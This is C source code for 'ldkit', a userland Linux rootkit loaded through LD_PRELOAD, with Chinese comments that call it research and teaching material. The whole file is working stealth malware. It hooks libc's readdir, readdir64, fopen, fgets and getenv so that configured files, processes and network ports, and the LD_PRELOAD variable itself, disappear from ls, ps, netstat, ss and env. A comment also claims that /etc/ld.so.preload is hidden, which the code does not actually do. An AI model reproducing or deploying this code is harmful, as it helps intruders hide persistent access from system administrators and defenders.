/*
 * ldkit - 基于 LD_PRELOAD 的用户态 Rootkit
 *
 * 通过劫持 libc 函数实现：
 *   1. 文件隐藏 —— 劫持 readdir/readdir64
 *   2. 进程隐藏 —— 劫持 readdir（过滤 /proc 下的 PID 目录）
 *   3. 网络连接隐藏 —— 劫持 fopen/fgets（过滤 /proc/net/tcp）
 *   4. 环境变量隐藏 —— 劫持 getenv（隐藏 LD_PRELOAD）
 *
 * 仅供安全研究与教学用途
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>

#include "config.h"

/* ========== 工具函数 ========== */

/*
 * 检查字符串是否匹配关键字列表中的任意一项
 * 返回 1 表示匹配（应该隐藏），0 表示不匹配
 */
static int match_list(const char* str, const char** list) {
    if (!str || !list) return 0;
    for (int i = 0; list[i] != NULL; i++) {
        if (strstr(str, list[i]) != NULL)
            return 1;
    }
    return 0;
}

/*
 * 检查端口号是否在隐藏列表中
 */
static int match_port(int port) {
    for (int i = 0; HIDDEN_PORTS[i] != 0; i++) {
        if (HIDDEN_PORTS[i] == port)
            return 1;
    }
    return 0;
}

/*
 * 检查字符串是否全是数字（用于判断 /proc 下的 PID 目录）
 */
static int is_pid(const char* str) {
    if (!str || !*str) return 0;
    for (; *str; str++) {
        if (!isdigit((unsigned char)*str)) return 0;
    }
    return 1;
}

/*
 * 读取 /proc/<pid>/cmdline 获取进程命令行
 * 返回 1 表示该进程应该被隐藏
 */
static int should_hide_pid(const char* pid_str) {
    char path[256];
    char cmdline[256];

    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);

    /* 直接用 syscall 级别的 open/read，避免触发自己的 hook */
    int fd = open(path, 0 /* O_RDONLY */);
    if (fd < 0) return 0;

    ssize_t n = read(fd, cmdline, sizeof(cmdline) - 1);
    close(fd);

    if (n <= 0) return 0;
    cmdline[n] = '\0';

    /* cmdline 中的参数用 \0 分隔，替换成空格方便匹配 */
    for (int i = 0; i < n; i++) {
        if (cmdline[i] == '\0') cmdline[i] = ' ';
    }

    return match_list(cmdline, HIDDEN_PROCS);
}

/* ========== 原始函数指针缓存 ========== */

/* 用宏简化原始函数指针的获取 */
#define LOAD_REAL(ret_type, name, ...) \
    static ret_type (*real_##name)(__VA_ARGS__) = NULL; \
    if (!real_##name) { \
        real_##name = dlsym(RTLD_NEXT, #name); \
    }

/* ========== Hook: readdir —— 隐藏文件和进程 ========== */

/*
 * 劫持 readdir()
 *
 * ls、find 等命令遍历目录时调用此函数。
 * 我们在返回结果前检查文件名：
 *   - 如果文件名匹配 HIDDEN_FILES 列表，跳过
 *   - 如果是 /proc 下的 PID 目录且进程匹配 HIDDEN_PROCS，跳过
 */
struct dirent* readdir(DIR* dirp) {
    LOAD_REAL(struct dirent*, readdir, DIR*);

    struct dirent* entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        /* 检查是否匹配隐藏文件列表 */
        if (match_list(entry->d_name, HIDDEN_FILES))
            continue;

        /* 检查是否是需要隐藏的进程（/proc 下的数字目录） */
        if (is_pid(entry->d_name) && should_hide_pid(entry->d_name))
            continue;

        return entry;
    }
    return NULL;
}

/*
 * 劫持 readdir64()
 * 某些系统/程序使用 64 位版本的 readdir，需要同时 hook
 */
struct dirent64* readdir64(DIR* dirp) {
    LOAD_REAL(struct dirent64*, readdir64, DIR*);

    struct dirent64* entry;
    while ((entry = real_readdir64(dirp)) != NULL) {
        if (match_list(entry->d_name, HIDDEN_FILES))
            continue;

        if (is_pid(entry->d_name) && should_hide_pid(entry->d_name))
            continue;

        return entry;
    }
    return NULL;
}

/* ========== Hook: fopen/fgets —— 隐藏网络连接 ========== */

/*
 * 用于跟踪被 hook 的文件流
 * netstat/ss 读取 /proc/net/tcp 来获取网络连接信息
 * 我们在 fgets 返回时过滤掉包含隐藏端口的行
 */

/* 记录哪些 FILE* 是 /proc/net/ 下的文件 */
#define MAX_TRACKED 16
static FILE* tracked_files[MAX_TRACKED] = {0};

static void track_file(FILE* fp) {
    for (int i = 0; i < MAX_TRACKED; i++) {
        if (tracked_files[i] == NULL) {
            tracked_files[i] = fp;
            return;
        }
    }
}

static int is_tracked(FILE* fp) {
    for (int i = 0; i < MAX_TRACKED; i++) {
        if (tracked_files[i] == fp) return 1;
    }
    return 0;
}

static void untrack_file(FILE* fp) {
    for (int i = 0; i < MAX_TRACKED; i++) {
        if (tracked_files[i] == fp) {
            tracked_files[i] = NULL;
            return;
        }
    }
}

/*
 * 劫持 fopen()
 * 标记 /proc/net/ 下的文件，后续在 fgets 中过滤
 */
FILE* fopen(const char* pathname, const char* mode) {
    LOAD_REAL(FILE*, fopen, const char*, const char*);

    FILE* fp = real_fopen(pathname, mode);
    if (fp && pathname) {
        /* 标记 /proc/net/tcp、/proc/net/tcp6、/proc/net/udp 等 */
        if (strstr(pathname, "/proc/net/"))
            track_file(fp);

#if HIDE_PRELOAD_FILE
        /* 隐藏 /etc/ld.so.preload 的内容 */
        if (strcmp(pathname, "/etc/ld.so.preload") == 0)
            track_file(fp);
#endif
    }
    return fp;
}

/*
 * 从 /proc/net/tcp 的一行中提取本地端口号
 *
 * 格式示例：
 *   0: 0100007F:115C 00000000:0000 0A ...
 *   字段：      ^^^^ 这是十六进制的本地端口
 */
static int extract_local_port(const char* line) {
    /* 跳过行号和空格 */
    const char* p = strchr(line, ':');
    if (!p) return -1;
    p++;

    /* 跳过空格 */
    while (*p == ' ') p++;

    /* 跳过本地地址（到冒号） */
    p = strchr(p, ':');
    if (!p) return -1;
    p++;

    /* 读取十六进制端口号 */
    unsigned int port = 0;
    if (sscanf(p, "%X", &port) != 1) return -1;

    return (int)port;
}

/*
 * 劫持 fgets()
 * 对 /proc/net/ 文件的读取进行过滤，跳过包含隐藏端口的行
 */
char* fgets(char* buf, int size, FILE* stream) {
    LOAD_REAL(char*, fgets, char*, int, FILE*);

    if (!is_tracked(stream))
        return real_fgets(buf, size, stream);

    /* 对被跟踪的文件，循环读取直到找到不需要隐藏的行 */
    char* result;
    while ((result = real_fgets(buf, size, stream)) != NULL) {
        int port = extract_local_port(buf);
        if (port >= 0 && match_port(port))
            continue;  /* 跳过这一行 */
        return result;
    }
    return NULL;
}

/*
 * 劫持 fclose()
 * 清理跟踪列表
 */
int fclose(FILE* stream) {
    LOAD_REAL(int, fclose, FILE*);
    untrack_file(stream);
    return real_fclose(stream);
}

/* ========== Hook: getenv —— 隐藏 LD_PRELOAD 环境变量 ========== */

#if HIDE_LD_PRELOAD
/*
 * 劫持 getenv()
 * 当查询 LD_PRELOAD 时返回 NULL，防止被 env/printenv 发现
 */
char* getenv(const char* name) {
    LOAD_REAL(char*, getenv, const char*);

    if (name && strcmp(name, "LD_PRELOAD") == 0)
        return NULL;

    return real_getenv(name);
}
#endif

/* ========== 构造/析构函数 ========== */

/*
 * .so 被加载时自动执行
 * 可以在这里做初始化工作
 */
__attribute__((constructor))
static void ldkit_init(void) {
    /* 静默加载，不输出任何信息 */
}

/*
 * .so 被卸载时自动执行
 */
__attribute__((destructor))
static void ldkit_fini(void) {
    /* 清理工作 */
}
